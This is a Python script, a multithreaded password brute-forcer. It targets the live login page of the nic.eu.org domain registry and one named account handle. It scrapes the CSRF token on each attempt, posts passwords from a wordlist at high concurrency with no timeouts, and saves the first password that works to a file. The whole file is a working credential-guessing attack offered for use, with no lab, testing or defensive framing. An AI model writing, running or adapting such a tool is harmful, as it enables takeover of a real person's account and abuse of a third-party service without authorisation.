import sys
import requests
import threading
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
import time
import re
from datetime import datetime

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(message)s',
    datefmt='%H:%M:%S',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("brute.log", encoding="utf-8")
    ]
)

LOGIN_PAGE = "https://nic.eu.org/arf/en/login/"
LOGIN_URL = "https://nic.eu.org/arf/en/login/?next=/arf/en/"
HANDLE = "JA110-FREE"
PASSWORD_FILE = "weakpass_4.txt"
FOUND_FLAG = "final.txt"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/116.0.0.0 Safari/537.36"

found_event = threading.Event()
lock = threading.Lock()

def log(msg: str, level: str = "info") -> None:
    if level == "error":
        logging.error(msg)
    elif level == "warning":
        logging.warning(msg)
    else:
        logging.info(msg)

def check_password(password: str) -> bool:
    if not password.strip():
        log("[!] Empty password, skip.")
        return False
    if found_event.is_set():
        return False

    session = requests.Session()
    session.headers.update({"User-Agent": UA, "Referer": LOGIN_PAGE})

    try:
        r = session.get(LOGIN_PAGE)  # 不设置timeout
        if r.status_code != 200:
            log(f"[!] Failed to load login page, status {r.status_code}")
            return False

        m = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', r.text)
        if not m:
            log("[!] Failed to get CSRF token")
            return False
        csrf_token = m.group(1)

        data = {
            "csrfmiddlewaretoken": csrf_token,
            "handle": HANDLE,
            "password": password,
            "next": "/arf/en/",
        }

        start = time.perf_counter()
        post_resp = session.post(LOGIN_URL, data=data)  # 不设置timeout
        elapsed_ms = int((time.perf_counter() - start) * 1000)

        pwd_display = password.ljust(20)[:20]

        if post_resp.status_code in (403, 500) or "Your username and/or password is incorrect" in post_resp.text:
            log(f"[-] FAIL  | {elapsed_ms:5d} ms | {pwd_display} | HTTP {post_resp.status_code}")
            return False
        else:
            log(f"[+] FOUND | {elapsed_ms:5d} ms | {pwd_display}")
            with lock:
                with open(FOUND_FLAG, "w", encoding="utf-8") as f:
                    f.write(password)
            found_event.set()
            return True

    except requests.RequestException as e:
        log(f"[!] Request exception for password '{password}': {e}")
        return False
    except Exception as e:
        log(f"[!] Unexpected exception for password '{password}': {e}")
        return False

def main() -> None:
    max_workers = 16
    if len(sys.argv) > 1:
        try:
            max_workers = int(sys.argv[1])
        except ValueError:
            log(f"[!] Invalid thread count parameter: {sys.argv[1]}, using default 16")

    log(f"Starting brute force with max_workers={max_workers}")

    executor = ThreadPoolExecutor(max_workers=max_workers)
    futures = set()

    with open(PASSWORD_FILE, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            if found_event.is_set():
                break
            pwd = line.strip()
            if not pwd:
                continue
            future = executor.submit(check_password, pwd)
            futures.add(future)

            if len(futures) >= max_workers * 10:
                done, futures = wait(futures, return_when=FIRST_COMPLETED)

    for future in as_completed(futures):
        if found_event.is_set():
            break

    executor.shutdown(wait=True)

    if found_event.is_set():
        with open(FOUND_FLAG, encoding="utf-8") as f:
            pwd = f.read().strip()
        log(f"\n[✓] Correct password: {pwd}")
    else:
        log("\n[✗] No valid password found.")

if __name__ == "__main__":
    main()
